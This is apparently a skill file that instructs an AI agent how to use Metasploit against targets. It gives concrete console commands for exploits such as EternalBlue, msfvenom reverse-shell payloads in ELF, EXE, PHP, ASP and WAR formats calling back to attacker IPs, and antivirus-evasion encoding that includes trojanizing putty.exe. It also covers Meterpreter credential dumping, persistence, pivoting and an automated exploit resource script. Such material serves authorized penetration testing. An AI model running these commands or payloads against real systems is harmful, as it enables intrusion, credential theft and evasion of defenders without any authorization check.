---
name: Metasploit
description: Exploitation framework for developing and executing exploit code against remote targets, with integrated payload generation, post-exploitation modules, and pivoting support
---

# Metasploit

Pull this skill when you need to exploit a known vulnerability, generate a payload, establish a reverse shell, or use post-exploitation modules against a compromised host.

## RedAmon wiring

| Action | Tool | Notes |
|--------|------|-------|
| Interactive console | `metasploit_console` | Full MSF console session |
| Restart MSF | `msf_restart` | Restart the RPC daemon |
| Run single module | `metasploit_console` | Use `-x` or `run` in console |
| Payload generation | `metasploit_console` | `generate` or `msfvenom` via shell |
| Resource scripts | `metasploit_console` | `resource /path/to/script.rc` |

## Primer

Metasploit has 4 key concepts:

| Concept | Description | Example |
|---------|-------------|---------|
| **Module** | An exploit, scanner, or post-exploitation script | `exploit/multi/http/struts2_content_type_ognl` |
| **Payload** | Code that runs on the target after exploitation | `windows/x64/meterpreter/reverse_tcp` |
| **Target** | A specific platform/version the exploit works on | `Windows 2012 SP2` |
| **Encoder** | Obfuscates payloads to bypass signature detection | `x86/shikata_ga_nai` |

### Typical workflow

```
search → use → set options → check (optional) → exploit/shell
```

## Searching

```bash
# Inside msfconsole:
msf6 > search eternalromance
msf6 > search cve:2023 type:exploit
msf6 > search sMB
msf6 > search apache log4j
msf6 > search platform:windows target:2012

# Search categories
msf6 > search type:post platform:linux
msf6 > search type:auxiliary name:scanner
msf6 > search type:auxiliary name:discover
```

## Module configuration

```bash
# Select a module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show module info
msf6 > info

# Show required options
msf6 > show options

# Set required options
msf6 > set RHOSTS 192.168.1.100
msf6 > set RPORT 445
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Show advanced options
msf6 > show advanced

# Show available targets
msf6 > show targets

# Select a target
msf6 > set TARGET 1
```

## Common modules by category

### Remote code execution
```
exploit/multi/http/struts2_content_type_ognl        # Struts2 RCE
exploit/windows/smb/ms17_010_eternalblue            # EternalBlue SMB RCE
exploit/linux/http/drupal_drupalgeddon2             # Drupal RCE
exploit/multi/http/log4shell_header_injection       # Log4Shell
exploit/windows/http/exchange_proxylogon            # ProxyLogon Exchange
```

### Payload delivery
```
payload/cmd/unix/reverse_bash                       # Native bash reverse shell
payload/linux/x64/meterpreter/reverse_tcp           # Linux Meterpreter
payload/windows/x64/meterpreter/reverse_tcp         # Windows Meterpreter
payload/php/meterpreter/reverse_tcp                 # PHP Meterpreter
```

### Post-exploitation (getshell → post module)
```
post/windows/gather/hashdump                        # Dump SAM hashes
post/windows/gather/cachedump                       # Dump domain cached creds
post/windows/manage/enable_rdp                      # Enable RDP
post/multi/manage/autoroute                         # Add routes for pivoting
post/windows/manage/migrate                         # Migrate to stable process
```

### Scanners
```
auxiliary/scanner/portscan/tcp
auxiliary/scanner/smb/smb_login
auxiliary/scanner/ssh/ssh_login
auxiliary/scanner/http/wordpress_scanner
```

## Meterpreter guide

Once you have a Meterpreter session:

```bash
# Basic commands
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > ifconfig
meterpreter > route

# Privilege escalation
meterpreter > getsystem          # Attempt local priv esc (Token dup, service)
meterpreter > use priv           # Load privilege escalation extension

# Credential dumping
meterpreter > hashdump           # Dump SAM
meterpreter > lsa_dump_sam       # Dump LSA secrets
meterpreter > lsa_dump_secrets   # Dump LSA secrets (cached creds)

# File operations
meterpreter > upload /path/to/file C:\\target\\path
meterpreter > download C:\\target\\file /local/path
meterpreter > search -f "*.docx" -d C:\\Users
meterpreter > cat /etc/shadow

# Persistence
meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.50
meterpreter > run scheduleme

# Pivoting
meterpreter > run autoroute -s 10.0.0.0/8
meterpreter > portfwd add -L 0.0.0.0 -p 8080 -l 3389 -r 10.0.0.5
```

## Session management

```bash
# Background current session
meterpreter > background
# [*] Backgrounding session 1...

# List sessions
msf6 > sessions

# Interact with session
msf6 > sessions -i 1

# Run command across all sessions
msf6 > sessions -c "whoami" -l

# Kill sessions
msf6 > sessions -K  # Kill all
msf6 > sessions -k 1  # Kill session 1
```

## Payload generation (msfvenom)

Generate payloads outside msfconsole:

```bash
# Linux reverse shell (staged)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Windows reverse shell (stageless)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# PHP (for web delivery)
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o shell.php

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.1 LPORT=4444 -o shell.py

# ASP (for IIS)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp -o shell.asp

# WAR (for Tomcat/JBoss)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# Raw shellcode (for custom exploits)
msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
```

### Encoding for AV bypass
```bash
# Simple encoding (may not bypass modern AV)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/zutto_dekiru -i 10 -f exe -o encoded.exe

# Use custom template
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -x /tmp/putty.exe -k -f exe -o putty_payload.exe
```

## Resource scripts

```bash
# Automate with resource scripts
cat > /tmp/autoblue.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
EOF

# Run in msfconsole:
msf6 > resource /tmp/autoblue.rc
```

## Detection noise comparison

| Activity | Noise level | Notes |
|----------|-------------|-------|
| TCP scanner | Minimal | Looks like normal traffic |
| SMB login | Moderate | Multiple failed logins |
| Using exploit | High | Exploit-specific artifacts |
| Meterpreter shell | Medium-High | Encrypted, but unusual network patterns |
| hashdump | Medium | LSASS access events |
| Adds persistence | High | Service/registry changes |

## Pitfalls and recovery

| Pitfall | Fix |
|---------|-----|
| "No matching target" | Try `show targets` and set one explicitly |
| Payload caught by AV | Use stageless payloads, custom templates, or shellcode obfuscation |
| Module not working (wrong version) | Double-check target version; some exploits are version-specific |
| Session dies immediately | Payload architecture mismatch (x86 vs x64). Check target arch. |
| Cannot connect back | Firewall blocking. Try `reverse_https` or `bind_tcp` payload. |
| Meterpreter no priv esc | `getsystem` uses known techniques. Manual PE may be needed. |
| "Exploit completed but no session" | Module ran but payload didn't execute. Try a different payload or check payload path. |

## Hand-off

- After getting a shell: `-> /skill/tooling/impacket` for lateral movement
- After hashdump: `-> /skill/tooling/hashcat` to crack passwords
- For AD post-exploitation: `-> /skill/active_directory/ad_kill_chain`
- For establishing tunnels: `-> /skill/network/pivoting_tunneling`
- For credential gathering: `-> /skill/post_exploitation/credential_gathering`

## Pro tips

- **Always background sessions**: Don't keep an interactive shell when you can background (`Ctrl+Z`, then `y`) and continue working. Use `sessions -i N` to re-enter.
- **Use `setg` for global options**: `setg RHOSTS 192.168.1.0/24` persists across module changes. Saves re-typing common options.
- **Stageless vs Staged**: Staged payloads (`reverse_tcp`) are smaller but require a second connection. Stageless (`reverse_tcp` → `meterpreter_reverse_tcp` without underscore) are bigger (can't encode), but more reliable over restrictive networks.
- **Msfvenom is more useful than the console**: For most engagements, you'll use msfvenom for payload generation and handle the shell manually. The console is mainly for exploit modules and Meterpreter's post-exploitation features.
- **AutoRunScript for every session**: `setg AutoRunScript post/windows/manage/migrate` automatically migrates every new Meterpreter session to a stable process (like explorer.exe) to avoid dying when the exploited process restarts.
